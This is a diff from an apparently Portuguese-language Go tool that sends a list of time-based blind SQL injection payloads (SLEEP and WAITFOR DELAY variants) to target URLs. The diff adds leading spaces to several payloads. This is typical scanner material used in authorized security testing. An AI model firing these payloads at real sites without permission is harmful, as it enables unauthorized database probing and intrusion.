@@ -112,13 +112,13 @@ func main() {
 		"' or sleep(tempoSQLi)='",
 		"') or sleep(tempoSQLi)='",
 		"')) or sleep(tempoSQLi)='",
-		"or SLEEP(tempoSQLi)",
-		"or SLEEP(tempoSQLi)#",
-		"or SLEEP(tempoSQLi)--",
-		"or SLEEP(tempoSQLi)=",
-		"or SLEEP(tempoSQLi)='",
-		"or WAITFOR DELAY 'tempoSQLi'",
-		"or WAITFOR DELAY 'tempoSQLi'--",
+		" or SLEEP(tempoSQLi)",
+		" or SLEEP(tempoSQLi)#",
+		" or SLEEP(tempoSQLi)--",
+		" or SLEEP(tempoSQLi)=",
+		" or SLEEP(tempoSQLi)='",
+		" or WAITFOR DELAY 'tempoSQLi'",
+		" or WAITFOR DELAY 'tempoSQLi'--",
 	}
 
 	testarURLs(tempoSQLi, payloads)
